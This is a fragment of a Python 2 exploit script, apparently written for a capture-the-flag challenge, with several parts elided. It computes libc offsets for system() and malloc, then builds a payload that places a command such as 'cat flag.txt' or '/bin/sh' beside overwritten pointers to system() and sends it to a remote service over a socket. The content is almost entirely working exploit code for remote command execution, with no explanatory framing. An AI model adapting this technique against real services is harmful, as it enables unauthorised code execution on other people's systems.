...
#    offset_malloc = offset_system+0x37f470#
    offset_malloc=0x000000000007bfc0
    offset_dl=0x3bf2b0
    TIME=0.02
    ...
    offset_malloc = 0x0000000000083550
...
#dump(0,readbuffer[readbuffer.index("yer:")+5:])
...
MALLOC=LIBCSTART-offset_start+offset_malloc
print "SYSTEM=",baseN(SYSTEM,16,16)
#NOM2='/bin/sh'+"\x00"+'CCCCDDDD'+adr_to_str32(SYSTEM)+adr_to_str32(MALLOC)
NOM2="cat flag.txt"+"\x00"+'DDD'+adr_to_str32(SYSTEM)+adr_to_str32(MALLOC)
NOM2=CMD+"\x00"+"D"*(15-len(CMD))+adr_to_str32(SYSTEM)+adr_to_str32(MALLOC)
time.sleep(TIME)
s.send("y"+"\n")
time.sleep(TIME)
s.send(NOM2+"\n")
